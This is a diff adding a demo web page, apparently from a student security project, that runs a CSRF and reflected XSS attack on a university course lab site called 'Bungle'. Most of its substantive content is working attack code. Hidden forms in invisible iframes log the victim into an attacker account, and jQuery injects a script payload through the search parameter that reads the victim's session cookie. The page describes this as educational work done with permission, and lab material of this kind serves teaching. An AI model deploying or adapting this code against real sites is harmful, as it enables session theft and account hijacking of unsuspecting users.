@@ -1,0 +1,203 @@
+<link href="https://fonts.googleapis.com/css?family=Press+Start+2P|Raleway" rel="stylesheet">
+
+<!-- Loading in jquery from a CDN, requires active internet connection!-->
+<script src="https://code.jquery.com/jquery-1.12.3.min.js" integrity="sha256-aaODHAgvwQW1bFOGXMeX+pC4PZIPsvn2h1sArYOhgXQ=" crossorigin="anonymous"></script>
+
+<a href="https://github.com/ksparakis/XSS-CSRF-Vuln-Examples"><img style="position: absolute; top: 0; right: 0; border: 0;" src="https://camo.githubusercontent.com/a6677b08c955af8400f44c6298f40e7d19cc5b2d/68747470733a2f2f73332e616d617a6f6e6177732e636f6d2f6769746875622f726962626f6e732f666f726b6d655f72696768745f677261795f3664366436642e706e67" alt="Fork me on GitHub" data-canonical-src="https://s3.amazonaws.com/github/ribbons/forkme_right_gray_6d6d6d.png"></a>
+
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/flat-ui/2.3.0/css/flat-ui.css" />
+<style>
+    h1 {
+        /*font-family: Raleway script=all rev=3;*/
+        color: #000;
+        margin-top: 50px;
+        margin-bottom: 60px;
+        font-family: 'Press Start 2P', cursive;
+        font-size: 50px;
+        font-style: normal;
+        font-variant: normal;
+        font-weight: 600;
+        line-height: 60px;
+        text-align: center;
+    }
+    /* .test {
+        animation: MoveUpDown 5s linear infinite;
+    
+    @keyframes MoveUpDown {
+        0% {
+            top: 100;
+        }
+        50% {
+            top: 500px;
+        }
+        100% {
+            top: 100;
+        }
+    }
+    }*/
+    
+    .grad {
+        background: #EEEEEE;
+        /* For browsers that do not support gradients */
+        background: -webkit-linear-gradient(#EEEEEE, #BFBFBF);
+        /* For Safari 5.1 to 6.0 */
+        background: -o-linear-gradient(#EEEEEE, #BFBFBF);
+        /* For Opera 11.1 to 12.0 */
+        background: -moz-linear-gradient(#EEEEEE, #BFBFBF);
+        /* For Firefox 3.6 to 15 */
+        background: linear-gradient(#EEEEEE, #BFBFBF);
+        /* Standard syntax */
+    }
+    
+    .test {
+        -webkit-animation: mover 2s infinite alternate;
+        animation: mover 2s infinite alternate;
+    }
+    
+    @-webkit-keyframes mover {
+        0% {
+            transform: translateY(0);
+        }
+        100% {
+            transform: translateY(-20px);
+        }
+    }
+    
+    @keyframes mover {
+        0% {
+            transform: translateY(0);
+        }
+        100% {
+            transform: translateY(-20px);
+        }
+    }
+    
+    .rcorner {
+        margin: auto auto;
+        border-radius: 5px;
+        background: #FFFFFF;
+        color: #000;
+        padding: 20px;
+        width: 330px;
+        box-shadow: 0 1px 2px rgba(0, 0, 0, 0.07);
+    }
+    
+    a:visited {
+        color: #19B5FE;
+    }
+    
+    a: {
+        color: #19B5FE;
+    }
+</style>
+
+<body class="grad">
+    <h1>CSFR - XSS Examples</h1>
+
+    <h4 style="text-align:center"><a href="http://www.twitter.com/sparakis">@Sparakis</a></h2>
+
+    <div class="rcorner" style="background:#ffffff">
+       <strong> Do not use this code malicously it is strictly intended for educational purposes.</strong>
+               <br>
+               <br>
+        <strong>Tested in Mozzila and Chrome</strong>
+        <br>
+
+        <br> Hey,
+        <br>
+        <br> My name is Konstantino Sparakis.
+        <br> BU M.S. Computer Engineering 17'.
+        <br>
+        <br>I put together this demo for Cross Site Forgery Requests and Cross Site Scripting attacks. We are attacking a website called Bungle! (with proper permission), it is currently hosted on <a href="http://cs558web.bu.edu/project2/">BU's Network.</a>
+        <br>
+        <br>
+        <br>
+        <h3>Demo:</h3> <strong>Step 1.</strong><br> Go to the website by clicking <a href="http://cs558web.bu.edu/project2/">HERE</a>. Notice how you are not logged in.
+        <br> (Don't make an account)
+        <br>
+        <br>
+        <strong>Step 2.</strong>
+        <br>
+        <button style="margin-top:30px;margin-left:100px" class="btn btn-danger">Execute Attack</button>
+        <br>
+        <br>
+        <strong>Step 3.</strong>
+        <br>
+        
+         Go Back to <a href="http://cs558web.bu.edu/project2/">Bungle</a>. Notice how you are logged in to the attackers account, you should also have recieved an alert with your session cookie. If you where logged in at the time of execution, and I stole your session cookie, I could copy that over and access the website as if I was you.
+        
+
+    </div>
+
+    <div style="margin: auto auto; margin-top:30px; width: 330px;">
+        <a href="https://dribbble.com/shots/1836919-Astronaut" style="margin-left:100px"><img class="test" src="https://github.com/ksparakis/XSS-CSRF-Vuln-Examples/raw/master/site/astro.png" height="150px"></a>
+    </div>
+    
+    
+    <!-- This form points to our target, post function, it is hidden and has our fake data, 
+by targeting out iframe we ensure that the page doesnt go to where the action is and it stays hidden.-->
+<form name="CSRF" style="width:0px;height:0px;" id="formal" target="hiddeniframe" method="get" action="http://cs558web.bu.edu/project2/search">
+    <input type="hidden" name="xssdefense" value="0">
+    <input type="hidden" name="csrfdefense" value="0">
+    <input type="hidden" name="q" value="">
+</form>
+    
+    <form name="CSRF1" method="POST" target="hiddeniframe2" action="http://cs558web.bu.edu/project2/login">
+    <input type="hidden" name="username" value="attacker">
+    <input type="hidden" name="password" value="l33th4x">
+    <input type="hidden" name="xssdefense" value="0">
+    <input type="hidden" name="csrfdefense" value="0">
+</form>
+
+<iframe name="hiddeniframe" style="width:0px;height:0px"></iframe>
+<iframe name="hiddeniframe2" style="width:0px;height:0px"></iframe>
+</body>
+
+
+
+<script>
+    $('a').click(function () {
+        window.open($(this).attr('href'));
+        return false;
+    });
+    
+    
+    
+     function getCookie(name) {
+        var value = "; " + document.cookie;
+        var parts = value.split("; " + name + "=");
+        if (parts.length == 2) return parts.pop().split(";").shift();
+    }
+    function payload() {
+        var cc = getCookie("authuser");
+        alert("I have attempted to log you in as \"Attacker\"...\n\nOh and I also stole your session cookie:\n"+cc);
+    }
+    
+    
+    $(document).ready(function () {
+        
+         //Hides the iframe from the users view
+        $("iframe[name=hiddeniframe]").hide();
+        $("form[name='CSRF']").hide();
+         $("iframe[name=hiddeniframe2]").hide();
+        $("form[name='CSRF1']").hide();
+        
+        $( ".btn-danger" ).click(function() {
+            // Log user in to attacker
+             CSRF1.submit();
+            
+            //Setup Payload
+            var payloadString = "<script>" + payload.toString() + ";"+ getCookie.toString() +
+                ";payload();</" + "script>";
+            var url =  payloadString;
+            //Changes the forms value to include my payload
+            $("input[name=q]").val(url);
+            //Submits the form to get token
+            CSRF.submit();
+           
+            
+        
+        });
+       
+    });
+</script>
